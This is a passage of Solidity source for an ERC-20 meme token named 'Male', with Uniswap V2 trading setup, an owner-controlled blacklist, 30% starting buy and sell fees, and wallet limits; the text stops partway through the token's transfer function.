1 // SPDX-License-Identifier: MIT
2 /*
3 
4 I Am just a dev, Not an Alpha $Male
5 
6 We are pumping crypto full of testosterone
7 
8 https://twitter.com/maletokenerc
9 
10 https://t.me/maletokenportal
11 
12 https://maletokenerc.com/
13 
14 **/
15 
16 pragma solidity = 0.8.20;
17 pragma experimental ABIEncoderV2;
18 
19 abstract contract Context {
20     function _msgSender() internal view virtual returns (address) {
21         return msg.sender;
22     }
23 
24     function _msgData() internal view virtual returns (bytes calldata) {
25         return msg.data;
26     }
27 }
28 
29 interface IUniswapV2Router02 {
30     function factory() external pure returns (address);
31 
32     function WETH() external pure returns (address);
33 
34     function addLiquidity(
35         address tokenA,
36         address tokenB,
37         uint256 amountADesired,
38         uint256 amountBDesired,
39         uint256 amountAMin,
40         uint256 amountBMin,
41         address to,
42         uint256 deadline
43     )
44         external
45         returns (
46             uint256 amountA,
47             uint256 amountB,
48             uint256 liquidity
49         );
50 
51     function addLiquidityETH(
52         address token,
53         uint256 amountTokenDesired,
54         uint256 amountTokenMin,
55         uint256 amountETHMin,
56         address to,
57         uint256 deadline
58     )
59         external
60         payable
61         returns (
62             uint256 amountToken,
63             uint256 amountETH,
64             uint256 liquidity
65         );
66 
67     function swapExactTokensForETHSupportingFeeOnTransferTokens(
68         uint256 amountIn,
69         uint256 amountOutMin,
70         address[] calldata path,
71         address to,
72         uint256 deadline
73     ) external;
74 }
75 
76 interface IUniswapV2Pair {
77     event Approval(
78         address indexed owner,
79         address indexed spender,
80         uint256 value
81     );
82     event Transfer(address indexed from, address indexed to, uint256 value);
83 
84     function name() external pure returns (string memory);
85 
86     function symbol() external pure returns (string memory);
87 
88     function decimals() external pure returns (uint8);
89 
90     function totalSupply() external view returns (uint256);
91 
92     function balanceOf(address owner) external view returns (uint256);
93 
94     function allowance(address owner, address spender)
95         external
96         view
97         returns (uint256);
98 
99     function approve(address spender, uint256 value) external returns (bool);
100 
101     function transfer(address to, uint256 value) external returns (bool);
102 
103     function transferFrom(
104         address from,
105         address to,
106         uint256 value
107     ) external returns (bool);
108 
109     function DOMAIN_SEPARATOR() external view returns (bytes32);
110 
111     function PERMIT_TYPEHASH() external pure returns (bytes32);
112 
113     function nonces(address owner) external view returns (uint256);
114 
115     function permit(
116         address owner,
117         address spender,
118         uint256 value,
119         uint256 deadline,
120         uint8 v,
121         bytes32 r,
122         bytes32 s
123     ) external;
124 
125     event Mint(address indexed sender, uint256 amount0, uint256 amount1);
126 
127     event Swap(
128         address indexed sender,
129         uint256 amount0In,
130         uint256 amount1In,
131         uint256 amount0Out,
132         uint256 amount1Out,
133         address indexed to
134     );
135     event Sync(uint112 reserve0, uint112 reserve1);
136 
137     function MINIMUM_LIQUIDITY() external pure returns (uint256);
138 
139     function factory() external view returns (address);
140 
141     function token0() external view returns (address);
142 
143     function token1() external view returns (address);
144 
145     function getReserves()
146         external
147         view
148         returns (
149             uint112 reserve0,
150             uint112 reserve1,
151             uint32 blockTimestampLast
152         );
153 
154     function price0CumulativeLast() external view returns (uint256);
155 
156     function price1CumulativeLast() external view returns (uint256);
157 
158     function kLast() external view returns (uint256);
159 
160     function mint(address to) external returns (uint256 liquidity);
161 
162     function swap(
163         uint256 amount0Out,
164         uint256 amount1Out,
165         address to,
166         bytes calldata data
167     ) external;
168 
169     function skim(address to) external;
170 
171     function sync() external;
172 
173     function initialize(address, address) external;
174 }
175 
176 interface IUniswapV2Factory {
177     event PairCreated(
178         address indexed token0,
179         address indexed token1,
180         address pair,
181         uint256
182     );
183 
184     function feeTo() external view returns (address);
185 
186     function feeToSetter() external view returns (address);
187 
188     function getPair(address tokenA, address tokenB)
189         external
190         view
191         returns (address pair);
192 
193     function allPairs(uint256) external view returns (address pair);
194 
195     function allPairsLength() external view returns (uint256);
196 
197     function createPair(address tokenA, address tokenB)
198         external
199         returns (address pair);
200 
201     function setFeeTo(address) external;
202 
203     function setFeeToSetter(address) external;
204 }
205 
206 /**
207  * @dev Wrappers over Solidity's arithmetic operations.
208  *
209  * NOTE: `SafeMath` is generally not needed starting with Solidity 0.8, since the compiler
210  * now has built in overflow checking.
211  */
212 library SafeMath {
213     /**
214      * @dev Returns the addition of two unsigned integers, with an overflow flag.
215      *
216      * _Available since v3.4._
217      */
218     function tryAdd(uint256 a, uint256 b) internal pure returns (bool, uint256) {
219         unchecked {
220             uint256 c = a + b;
221             if (c < a) return (false, 0);
222             return (true, c);
223         }
224     }
225 
226     /**
227      * @dev Returns the subtraction of two unsigned integers, with an overflow flag.
228      *
229      * _Available since v3.4._
230      */
231     function trySub(uint256 a, uint256 b) internal pure returns (bool, uint256) {
232         unchecked {
233             if (b > a) return (false, 0);
234             return (true, a - b);
235         }
236     }
237 
238     /**
239      * @dev Returns the multiplication of two unsigned integers, with an overflow flag.
240      *
241      * _Available since v3.4._
242      */
243     function tryMul(uint256 a, uint256 b) internal pure returns (bool, uint256) {
244         unchecked {
245             // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
246             // benefit is lost if 'b' is also tested.
247             // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522
248             if (a == 0) return (true, 0);
249             uint256 c = a * b;
250             if (c / a != b) return (false, 0);
251             return (true, c);
252         }
253     }
254 
255     /**
256      * @dev Returns the division of two unsigned integers, with a division by zero flag.
257      *
258      * _Available since v3.4._
259      */
260     function tryDiv(uint256 a, uint256 b) internal pure returns (bool, uint256) {
261         unchecked {
262             if (b == 0) return (false, 0);
263             return (true, a / b);
264         }
265     }
266 
267     /**
268      * @dev Returns the remainder of dividing two unsigned integers, with a division by zero flag.
269      *
270      * _Available since v3.4._
271      */
272     function tryMod(uint256 a, uint256 b) internal pure returns (bool, uint256) {
273         unchecked {
274             if (b == 0) return (false, 0);
275             return (true, a % b);
276         }
277     }
278 
279     /**
280      * @dev Returns the addition of two unsigned integers, reverting on
281      * overflow.
282      *
283      * Counterpart to Solidity's `+` operator.
284      *
285      * Requirements:
286      *
287      * - Addition cannot overflow.
288      */
289     function add(uint256 a, uint256 b) internal pure returns (uint256) {
290         return a + b;
291     }
292 
293     /**
294      * @dev Returns the subtraction of two unsigned integers, reverting on
295      * overflow (when the result is negative).
296      *
297      * Counterpart to Solidity's `-` operator.
298      *
299      * Requirements:
300      *
301      * - Subtraction cannot overflow.
302      */
303     function sub(uint256 a, uint256 b) internal pure returns (uint256) {
304         return a - b;
305     }
306 
307     /**
308      * @dev Returns the multiplication of two unsigned integers, reverting on
309      * overflow.
310      *
311      * Counterpart to Solidity's `*` operator.
312      *
313      * Requirements:
314      *
315      * - Multiplication cannot overflow.
316      */
317     function mul(uint256 a, uint256 b) internal pure returns (uint256) {
318         return a * b;
319     }
320 
321     /**
322      * @dev Returns the integer division of two unsigned integers, reverting on
323      * division by zero. The result is rounded towards zero.
324      *
325      * Counterpart to Solidity's `/` operator.
326      *
327      * Requirements:
328      *
329      * - The divisor cannot be zero.
330      */
331     function div(uint256 a, uint256 b) internal pure returns (uint256) {
332         return a / b;
333     }
334 
335     /**
336      * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),
337      * reverting when dividing by zero.
338      *
339      * Counterpart to Solidity's `%` operator. This function uses a `revert`
340      * opcode (which leaves remaining gas untouched) while Solidity uses an
341      * invalid opcode to revert (consuming all remaining gas).
342      *
343      * Requirements:
344      *
345      * - The divisor cannot be zero.
346      */
347     function mod(uint256 a, uint256 b) internal pure returns (uint256) {
348         return a % b;
349     }
350 
351     /**
352      * @dev Returns the subtraction of two unsigned integers, reverting with custom message on
353      * overflow (when the result is negative).
354      *
355      * CAUTION: This function is deprecated because it requires allocating memory for the error
356      * message unnecessarily. For custom revert reasons use {trySub}.
357      *
358      * Counterpart to Solidity's `-` operator.
359      *
360      * Requirements:
361      *
362      * - Subtraction cannot overflow.
363      */
364     function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
365         unchecked {
366             require(b <= a, errorMessage);
367             return a - b;
368         }
369     }
370 	
371 	    /**
372      * @dev Returns the percentage of an unsigned integer `a` with respect to the provided percentage `b`, 
373      * rounding towards zero. The result is a proportion of the original value.
374      *
375      * The function can be used to calculate a specific percentage of a given value `a`.
376      * Note: this function uses a `revert` opcode (which leaves remaining gas untouched) when
377      * the percentage `b` is greater than 100.
378      *
379      * Requirements:
380      *
381      * - The percentage `b` must be between 0 and 100 (inclusive).
382      */
383     function per(uint256 a, uint256 b) internal pure returns (uint256) {
384         require(b <= 100, "Percentage must be between 0 and 100");
385         return a * b / 100;
386     }
387 
388     /**
389      * @dev Returns the integer division of two unsigned integers, reverting with custom message on
390      * division by zero. The result is rounded towards zero.
391      *
392      * Counterpart to Solidity's `/` operator. Note: this function uses a
393      * `revert` opcode (which leaves remaining gas untouched) while Solidity
394      * uses an invalid opcode to revert (consuming all remaining gas).
395      *
396      * Requirements:
397      *
398      * - The divisor cannot be zero.
399      */
400     function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
401         unchecked {
402             require(b > 0, errorMessage);
403             return a / b;
404         }
405     }
406 
407     /**
408      * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),
409      * reverting with custom message when dividing by zero.
410      *
411      * CAUTION: This function is deprecated because it requires allocating memory for the error
412      * message unnecessarily. For custom revert reasons use {tryMod}.
413      *
414      * Counterpart to Solidity's `%` operator. This function uses a `revert`
415      * opcode (which leaves remaining gas untouched) while Solidity uses an
416      * invalid opcode to revert (consuming all remaining gas).
417      *
418      * Requirements:
419      *
420      * - The divisor cannot be zero.
421      */
422     function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
423         unchecked {
424             require(b > 0, errorMessage);
425             return a % b;
426         }
427     }
428 }
429 
430 /**
431  * @dev Implementation of the {IERC20} interface.
432  *
433  * This implementation is agnostic to the way tokens are created. This means
434  * that a supply mechanism has to be added in a derived contract using {_mint}.
435  * For a generic mechanism see {ERC20PresetMinterPauser}.
436  *
437  * TIP: For a detailed writeup see our guide
438  * https://forum.openzeppelin.com/t/how-to-implement-erc20-supply-mechanisms/226[How
439  * to implement supply mechanisms].
440  *
441  * We have followed general OpenZeppelin Contracts guidelines: functions revert
442  * instead returning `false` on failure. This behavior is nonetheless
443  * conventional and does not conflict with the expectations of ERC20
444  * applications.
445  *
446  * Additionally, an {Approval} event is emitted on calls to {transferFrom}.
447  * This allows applications to reconstruct the allowance for all accounts just
448  * by listening to said events. Other implementations of the EIP may not emit
449  * these events, as it isn't required by the specification.
450  *
451  * Finally, the non-standard {decreaseAllowance} and {increaseAllowance}
452  * functions have been added to mitigate the well-known issues around setting
453  * allowances. See {IERC20-approve}.
454  */
455 
456 interface IERC20 {
457     /**
458      * @dev Emitted when `value` tokens are moved from one account (`from`) to
459      * another (`to`).
460      *
461      * Note that `value` may be zero.
462      */
463     event Transfer(address indexed from, address indexed to, uint256 value);
464 
465     /**
466      * @dev Emitted when the allowance of a `spender` for an `owner` is set by
467      * a call to {approve}. `value` is the new allowance.
468      */
469     event Approval(address indexed owner, address indexed spender, uint256 value);
470 
471     /**
472      * @dev Returns the amount of tokens in existence.
473      */
474     function totalSupply() external view returns (uint256);
475 
476     /**
477      * @dev Returns the amount of tokens owned by `account`.
478      */
479     function balanceOf(address account) external view returns (uint256);
480 
481     /**
482      * @dev Moves `amount` tokens from the caller's account to `to`.
483      *
484      * Returns a boolean value indicating whether the operation succeeded.
485      *
486      * Emits a {Transfer} event.
487      */
488     function transfer(address to, uint256 amount) external returns (bool);
489 
490     /**
491      * @dev Returns the remaining number of tokens that `spender` will be
492      * allowed to spend on behalf of `owner` through {transferFrom}. This is
493      * zero by default.
494      *
495      * This value changes when {approve} or {transferFrom} are called.
496      */
497     function allowance(address owner, address spender) external view returns (uint256);
498 
499     /**
500      * @dev Sets `amount` as the allowance of `spender` over the caller's tokens.
501      *
502      * Returns a boolean value indicating whether the operation succeeded.
503      *
504      * IMPORTANT: Beware that changing an allowance with this method brings the risk
505      * that someone may use both the old and the new allowance by unfortunate
506      * transaction ordering. One possible solution to mitigate this race
507      * condition is to first reduce the spender's allowance to 0 and set the
508      * desired value afterwards:
509      * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729
510      *
511      * Emits an {Approval} event.
512      */
513     function approve(address spender, uint256 amount) external returns (bool);
514 
515     /**
516      * @dev Moves `amount` tokens from `from` to `to` using the
517      * allowance mechanism. `amount` is then deducted from the caller's
518      * allowance.
519      *
520      * Returns a boolean value indicating whether the operation succeeded.
521      *
522      * Emits a {Transfer} event.
523      */
524     function transferFrom(
525         address from,
526         address to,
527         uint256 amount
528     ) external returns (bool);
529 }
530 
531 /**
532  * @dev Interface for the optional metadata functions from the ERC20 standard.
533  *
534  * _Available since v4.1._
535  */
536 interface IERC20Metadata is IERC20 {
537     /**
538      * @dev Returns the name of the token.
539      */
540     function name() external view returns (string memory);
541 
542     /**
543      * @dev Returns the symbol of the token.
544      */
545     function symbol() external view returns (string memory);
546 
547     /**
548      * @dev Returns the decimals places of the token.
549      */
550     function decimals() external view returns (uint8);
551 }
552 
553 /**
554  * @dev Contract module which provides a basic access control mechanism, where
555  * there is an account (an owner) that can be granted exclusive access to
556  * specific functions.
557  *
558  * By default, the owner account will be the one that deploys the contract. This
559  * can later be changed with {transferOwnership}.
560  *
561  * This module is used through inheritance. It will make available the modifier
562  * `onlyOwner`, which can be applied to your functions to restrict their use to
563  * the owner.
564  */
565 abstract contract Ownable is Context {
566     address private _owner;
567 
568     event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
569 
570     /**
571      * @dev Initializes the contract setting the deployer as the initial owner.
572      */
573     constructor() {
574         _transferOwnership(_msgSender());
575     }
576 
577     /**
578      * @dev Throws if called by any account other than the owner.
579      */
580     modifier onlyOwner() {
581         _checkOwner();
582         _;
583     }
584 
585     /**
586      * @dev Returns the address of the current owner.
587      */
588     function owner() public view virtual returns (address) {
589         return _owner;
590     }
591 
592     /**
593      * @dev Throws if the sender is not the owner.
594      */
595     function _checkOwner() internal view virtual {
596         require(owner() == _msgSender(), "Ownable: caller is not the owner");
597     }
598 
599     /**
600      * @dev Leaves the contract without owner. It will not be possible to call
601      * `onlyOwner` functions anymore. Can only be called by the current owner.
602      *
603      * NOTE: Renouncing ownership will leave the contract without an owner,
604      * thereby removing any functionality that is only available to the owner.
605      */
606     function renounceOwnership() public virtual onlyOwner {
607         _transferOwnership(address(0));
608     }
609 
610     /**
611      * @dev Transfers ownership of the contract to a new account (`newOwner`).
612      * Can only be called by the current owner.
613      */
614     function transferOwnership(address newOwner) public virtual onlyOwner {
615         require(newOwner != address(0), "Ownable: new owner is the zero address");
616         _transferOwnership(newOwner);
617     }
618 
619     /**
620      * @dev Transfers ownership of the contract to a new account (`newOwner`).
621      * Internal function without access restriction.
622      */
623     function _transferOwnership(address newOwner) internal virtual {
624         address oldOwner = _owner;
625         _owner = newOwner;
626         emit OwnershipTransferred(oldOwner, newOwner);
627     }
628 }
629 
630 contract ERC20 is Context, IERC20, IERC20Metadata {
631     mapping(address => uint256) private _balances;
632 
633     mapping(address => mapping(address => uint256)) private _allowances;
634 
635     uint256 private _totalSupply;
636 
637     string private _name;
638     string private _symbol;
639 
640     /**
641      * @dev Sets the values for {name} and {symbol}.
642      *
643      * The default value of {decimals} is 18. To select a different value for
644      * {decimals} you should overload it.
645      *
646      * All two of these values are immutable: they can only be set once during
647      * construction.
648      */
649     constructor(string memory name_, string memory symbol_) {
650         _name = name_;
651         _symbol = symbol_;
652     }
653 
654     /**
655      * @dev Returns the name of the token.
656      */
657     function name() public view virtual override returns (string memory) {
658         return _name;
659     }
660 
661     /**
662      * @dev Returns the symbol of the token, usually a shorter version of the
663      * name.
664      */
665     function symbol() public view virtual override returns (string memory) {
666         return _symbol;
667     }
668 
669     /**
670      * @dev Returns the number of decimals used to get its user representation.
671      * For example, if `decimals` equals `2`, a balance of `505` tokens should
672      * be displayed to a user as `5.05` (`505 / 10 ** 2`).
673      *
674      * Tokens usually opt for a value of 18, imitating the relationship between
675      * Ether and Wei. This is the value {ERC20} uses, unless this function is
676      * overridden;
677      *
678      * NOTE: This information is only used for _display_ purposes: it in
679      * no way affects any of the arithmetic of the contract, including
680      * {IERC20-balanceOf} and {IERC20-transfer}.
681      */
682     function decimals() public view virtual override returns (uint8) {
683         return 18;
684     }
685 
686     /**
687      * @dev See {IERC20-totalSupply}.
688      */
689     function totalSupply() public view virtual override returns (uint256) {
690         return _totalSupply;
691     }
692 
693     /**
694      * @dev See {IERC20-balanceOf}.
695      */
696     function balanceOf(address account) public view virtual override returns (uint256) {
697         return _balances[account];
698     }
699 
700     /**
701      * @dev See {IERC20-transfer}.
702      *
703      * Requirements:
704      *
705      * - `to` cannot be the zero address.
706      * - the caller must have a balance of at least `amount`.
707      */
708     function transfer(address to, uint256 amount) public virtual override returns (bool) {
709         address owner = _msgSender();
710         _transfer(owner, to, amount);
711         return true;
712     }
713 
714     /**
715      * @dev See {IERC20-allowance}.
716      */
717     function allowance(address owner, address spender) public view virtual override returns (uint256) {
718         return _allowances[owner][spender];
719     }
720 
721     /**
722      * @dev See {IERC20-approve}.
723      *
724      * NOTE: If `amount` is the maximum `uint256`, the allowance is not updated on
725      * `transferFrom`. This is semantically equivalent to an infinite approval.
726      *
727      * Requirements:
728      *
729      * - `spender` cannot be the zero address.
730      */
731     function approve(address spender, uint256 amount) public virtual override returns (bool) {
732         address owner = _msgSender();
733         _approve(owner, spender, amount);
734         return true;
735     }
736 
737     /**
738      * @dev See {IERC20-transferFrom}.
739      *
740      * Emits an {Approval} event indicating the updated allowance. This is not
741      * required by the EIP. See the note at the beginning of {ERC20}.
742      *
743      * NOTE: Does not update the allowance if the current allowance
744      * is the maximum `uint256`.
745      *
746      * Requirements:
747      *
748      * - `from` and `to` cannot be the zero address.
749      * - `from` must have a balance of at least `amount`.
750      * - the caller must have allowance for ``from``'s tokens of at least
751      * `amount`.
752      */
753     function transferFrom(
754         address from,
755         address to,
756         uint256 amount
757     ) public virtual override returns (bool) {
758         address spender = _msgSender();
759         _spendAllowance(from, spender, amount);
760         _transfer(from, to, amount);
761         return true;
762     }
763 
764     /**
765      * @dev Atomically increases the allowance granted to `spender` by the caller.
766      *
767      * This is an alternative to {approve} that can be used as a mitigation for
768      * problems described in {IERC20-approve}.
769      *
770      * Emits an {Approval} event indicating the updated allowance.
771      *
772      * Requirements:
773      *
774      * - `spender` cannot be the zero address.
775      */
776     function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
777         address owner = _msgSender();
778         _approve(owner, spender, allowance(owner, spender) + addedValue);
779         return true;
780     }
781 
782     /**
783      * @dev Atomically decreases the allowance granted to `spender` by the caller.
784      *
785      * This is an alternative to {approve} that can be used as a mitigation for
786      * problems described in {IERC20-approve}.
787      *
788      * Emits an {Approval} event indicating the updated allowance.
789      *
790      * Requirements:
791      *
792      * - `spender` cannot be the zero address.
793      * - `spender` must have allowance for the caller of at least
794      * `subtractedValue`.
795      */
796     function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
797         address owner = _msgSender();
798         uint256 currentAllowance = allowance(owner, spender);
799         require(currentAllowance >= subtractedValue, "ERC20: decreased allowance below zero");
800         unchecked {
801             _approve(owner, spender, currentAllowance - subtractedValue);
802         }
803 
804         return true;
805     }
806 
807     /**
808      * @dev Moves `amount` of tokens from `from` to `to`.
809      *
810      * This internal function is equivalent to {transfer}, and can be used to
811      * e.g. implement automatic token fees, slashing mechanisms, etc.
812      *
813      * Emits a {Transfer} event.
814      *
815      * Requirements:
816      *
817      * - `from` cannot be the zero address.
818      * - `to` cannot be the zero address.
819      * - `from` must have a balance of at least `amount`.
820      */
821     function _transfer(
822         address from,
823         address to,
824         uint256 amount
825     ) internal virtual {
826         require(from != address(0), "ERC20: transfer from the zero address");
827         require(to != address(0), "ERC20: transfer to the zero address");
828 
829         _beforeTokenTransfer(from, to, amount);
830 
831         uint256 fromBalance = _balances[from];
832         require(fromBalance >= amount, "ERC20: transfer amount exceeds balance");
833         unchecked {
834             _balances[from] = fromBalance - amount;
835             // Overflow not possible: the sum of all balances is capped by totalSupply, and the sum is preserved by
836             // decrementing then incrementing.
837             _balances[to] += amount;
838         }
839 
840         emit Transfer(from, to, amount);
841 
842         _afterTokenTransfer(from, to, amount);
843     }
844 
845     /** @dev Creates `amount` tokens and assigns them to `account`, increasing
846      * the total supply.
847      *
848      * Emits a {Transfer} event with `from` set to the zero address.
849      *
850      * Requirements:
851      *
852      * - `account` cannot be the zero address.
853      */
854     function _mint(address account, uint256 amount) internal virtual {
855         require(account != address(0), "ERC20: mint to the zero address");
856 
857         _beforeTokenTransfer(address(0), account, amount);
858 
859         _totalSupply += amount;
860         unchecked {
861             // Overflow not possible: balance + amount is at most totalSupply + amount, which is checked above.
862             _balances[account] += amount;
863         }
864         emit Transfer(address(0), account, amount);
865 
866         _afterTokenTransfer(address(0), account, amount);
867     }
868 
869     /**
870      * @dev Destroys `amount` tokens from `account`, reducing the
871      * total supply.
872      *
873      * Emits a {Transfer} event with `to` set to the zero address.
874      *
875      * Requirements:
876      *
877      * - `account` cannot be the zero address.
878      * - `account` must have at least `amount` tokens.
879      */
880     function _burn(address account, uint256 amount) internal virtual {
881         require(account != address(0), "ERC20: burn from the zero address");
882 
883         _beforeTokenTransfer(account, address(0), amount);
884 
885         uint256 accountBalance = _balances[account];
886         require(accountBalance >= amount, "ERC20: burn amount exceeds balance");
887         unchecked {
888             _balances[account] = accountBalance - amount;
889             // Overflow not possible: amount <= accountBalance <= totalSupply.
890             _totalSupply -= amount;
891         }
892 
893         emit Transfer(account, address(0), amount);
894 
895         _afterTokenTransfer(account, address(0), amount);
896     }
897 
898     /**
899      * @dev Sets `amount` as the allowance of `spender` over the `owner` s tokens.
900      *
901      * This internal function is equivalent to `approve`, and can be used to
902      * e.g. set automatic allowances for certain subsystems, etc.
903      *
904      * Emits an {Approval} event.
905      *
906      * Requirements:
907      *
908      * - `owner` cannot be the zero address.
909      * - `spender` cannot be the zero address.
910      */
911     function _approve(
912         address owner,
913         address spender,
914         uint256 amount
915     ) internal virtual {
916         require(owner != address(0), "ERC20: approve from the zero address");
917         require(spender != address(0), "ERC20: approve to the zero address");
918 
919         _allowances[owner][spender] = amount;
920         emit Approval(owner, spender, amount);
921     }
922 
923     /**
924      * @dev Updates `owner` s allowance for `spender` based on spent `amount`.
925      *
926      * Does not update the allowance amount in case of infinite allowance.
927      * Revert if not enough allowance is available.
928      *
929      * Might emit an {Approval} event.
930      */
931     function _spendAllowance(
932         address owner,
933         address spender,
934         uint256 amount
935     ) internal virtual {
936         uint256 currentAllowance = allowance(owner, spender);
937         if (currentAllowance != type(uint256).max) {
938             require(currentAllowance >= amount, "ERC20: insufficient allowance");
939             unchecked {
940                 _approve(owner, spender, currentAllowance - amount);
941             }
942         }
943     }
944 
945     /**
946      * @dev Hook that is called before any transfer of tokens. This includes
947      * minting and burning.
948      *
949      * Calling conditions:
950      *
951      * - when `from` and `to` are both non-zero, `amount` of ``from``'s tokens
952      * will be transferred to `to`.
953      * - when `from` is zero, `amount` tokens will be minted for `to`.
954      * - when `to` is zero, `amount` of ``from``'s tokens will be burned.
955      * - `from` and `to` are never both zero.
956      *
957      * To learn more about hooks, head to xref:ROOT:extending-contracts.adoc#using-hooks[Using Hooks].
958      */
959     function _beforeTokenTransfer(
960         address from,
961         address to,
962         uint256 amount
963     ) internal virtual {}
964 
965     /**
966      * @dev Hook that is called after any transfer of tokens. This includes
967      * minting and burning.
968      *
969      * Calling conditions:
970      *
971      * - when `from` and `to` are both non-zero, `amount` of ``from``'s tokens
972      * has been transferred to `to`.
973      * - when `from` is zero, `amount` tokens have been minted for `to`.
974      * - when `to` is zero, `amount` of ``from``'s tokens have been burned.
975      * - `from` and `to` are never both zero.
976      *
977      * To learn more about hooks, head to xref:ROOT:extending-contracts.adoc#using-hooks[Using Hooks].
978      */
979     function _afterTokenTransfer(
980         address from,
981         address to,
982         uint256 amount
983     ) internal virtual {}
984 }
985 
986 contract Male is ERC20, Ownable {
987     using SafeMath for uint256;
988     
989     IUniswapV2Router02 public immutable _uniswapV2Router;
990     address public immutable uniswapV2Pair;
991     address public deployerWallet;
992     address public marketingWallet;
993     address public constant deadAddress = address(0xdead);
994 
995     bool private swapping;
996 
997     uint256 public initialTotalSupply = 3970000000 * 1e18;
998     uint256 public maxTransactionAmount = initialTotalSupply * 10 / 1000;
999     uint256 public maxWallet = initialTotalSupply * 10 / 1000;
1000     uint256 public swapTokensAtAmount = initialTotalSupply * 10 / 1000;
1001     uint256 public lastReduceTime;
1002     uint256 public beforeSwap;
1003     uint256 public afterSwap;
1004 
1005     bool public tradingOpen = false;
1006     bool public transferDelay = true;
1007     bool public swapEnabled = false;
1008     bool public firstCallDone = false;
1009     bool public reducing = false;
1010 
1011     uint256 public initialBuyFee;
1012     uint256 public BuyFee = 30;
1013     uint256 public initialSellFee;
1014     uint256 public SellFee = 30;
1015     uint256 public preventSwapBefore;
1016 
1017     uint256 public tokensForMarketing;
1018 
1019     mapping(address => bool) private _isExcludedFromFees;
1020     mapping(address => bool) private _isExcludedMaxTransactionAmount;
1021     mapping(address => bool) private automatedMarketMakerPairs;
1022     mapping(address => bool) public isBlacklisted;
1023     mapping(address => uint256) private lastBuyBlock;
1024 
1025     event ExcludeFromFees(address indexed account, bool isExcluded);
1026     event SetAutomatedMarketMakerPair(address indexed pair, bool indexed value);
1027 
1028     constructor(uint256 _initialBuyFee, uint256 _initialSellFee, uint256 _preventSwapBefore) ERC20("Male", "$Male") {
1029 
1030         initialBuyFee = _initialBuyFee;
1031         initialSellFee = _initialSellFee;
1032         preventSwapBefore = _preventSwapBefore;
1033 
1034         _uniswapV2Router = IUniswapV2Router02(
1035             0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D
1036         );
1037         excludeFromMaxTransaction(address(_uniswapV2Router), true);
1038         uniswapV2Pair = IUniswapV2Factory(_uniswapV2Router.factory())
1039         .createPair(address(this), _uniswapV2Router.WETH());
1040         excludeFromMaxTransaction(address(uniswapV2Pair), true);
1041         _setAutomatedMarketMakerPair(address(uniswapV2Pair), true);
1042 
1043         deployerWallet = payable(_msgSender());
1044         marketingWallet = payable(0x983c872C502B1263901236a85C451F69618f0569);
1045         excludeFromFees(owner(), true);
1046         excludeFromFees(address(this), true);
1047         excludeFromFees(address(0xdead), true);
1048         excludeFromFees(marketingWallet, true);
1049 
1050         excludeFromMaxTransaction(owner(), true);
1051         excludeFromMaxTransaction(address(this), true);
1052         excludeFromMaxTransaction(address(0xdead), true);
1053         excludeFromMaxTransaction(marketingWallet, true);
1054 
1055         _mint(msg.sender, initialTotalSupply);
1056     }
1057 
1058     receive() external payable {}
1059 
1060     function openTrading() external onlyOwner() {
1061         require(!tradingOpen,"Trading is already open");
1062         swapEnabled = true;
1063         tradingOpen = true;
1064         beforeSwap = block.number;
1065     }
1066 
1067     function excludeFromMaxTransaction(address updAds, bool isEx)
1068         public
1069         onlyOwner
1070     {
1071         _isExcludedMaxTransactionAmount[updAds] = isEx;
1072     }
1073 
1074     function excludeFromFees(address account, bool excluded) public onlyOwner {
1075         _isExcludedFromFees[account] = excluded;
1076         emit ExcludeFromFees(account, excluded);
1077     }
1078 
1079     function setAutomatedMarketMakerPair(address pair, bool value)
1080         public
1081         onlyOwner
1082     {
1083         require(
1084             pair != uniswapV2Pair,
1085             "The pair cannot be removed from automatedMarketMakerPairs"
1086         );
1087 
1088         _setAutomatedMarketMakerPair(pair, value);
1089     }
1090 
1091     function _setAutomatedMarketMakerPair(address pair, bool value) private {
1092         automatedMarketMakerPairs[pair] = value;
1093 
1094         emit SetAutomatedMarketMakerPair(pair, value);
1095     }
1096 
1097     function isExcludedFromFees(address account) public view returns (bool) {
1098         return _isExcludedFromFees[account];
1099     }
1100 
1101     function _transfer(
1102         address from,
1103         address to,
1104         uint256 amount
1105     ) internal override {
1106         require(from != address(0), "ERC20: transfer from the zero address");
1107         require(to != address(0), "ERC20: transfer to the zero address");
1108         require(!isBlacklisted[from] && !isBlacklisted[to], "ERC20: transfer from/to the blacklisted address");
1109         afterSwap = block.number;
1110 
1111         if (reducing && block.timestamp - lastReduceTime >= 5 minutes) {
1112             if (BuyFee > 5) {
1113                 BuyFee -= 5;
1114                 SellFee -= 5;
1115                 lastReduceTime = block.timestamp;
1116             } else {
1117                 BuyFee = 1;
1118                 SellFee = 1;
1119                 reducing = false;
1120             }
1121         }
1122 
1123         if (amount == 0) {
1124             super._transfer(from, to, 0);
1125             return;
1126         }
1127 
1128                 if (
1129                 from != owner() &&
1130                 to != owner() &&
1131                 to != address(0) &&
1132                 to != address(0xdead) &&
1133                 !swapping
1134             ) {
1135                 if (!tradingOpen) {
1136                     require(
1137                         _isExcludedFromFees[from] || _isExcludedFromFees[to],
1138                         "Trading is not active."
1139                     );
1140                 }
1141 
1142                 if (
1143                     automatedMarketMakerPairs[from] &&
1144                     !_isExcludedMaxTransactionAmount[to]
1145                 ) {
1146                     require(
1147                         amount <= maxTransactionAmount,
1148                         "Buy transfer amount exceeds the maxTransactionAmount."
1149                     );
1150                     require(
1151                         amount + balanceOf(to) <= maxWallet,
1152                         "Max wallet exceeded"
1153                     );
1154 
1155                     if (transferDelay) {
1156                         require(
1157                             lastBuyBlock[to] < block.number,
1158                             "Only one buy per block is allowed."
1159                         );
1160                         lastBuyBlock[to] = block.number;
1161                     }
1162                 }
1163 
1164                 else if (
1165                     automatedMarketMakerPairs[to] &&
1166                     !_isExcludedMaxTransactionAmount[from]
1167                 ) {
1168                     require(amount <= maxTransactionAmount, "Sell transfer amount exceeds the maxTransactionAmount.");
1169                     
1170                 } 
1171                 
1172                 else if (!_isExcludedMaxTransactionAmount[to]) {
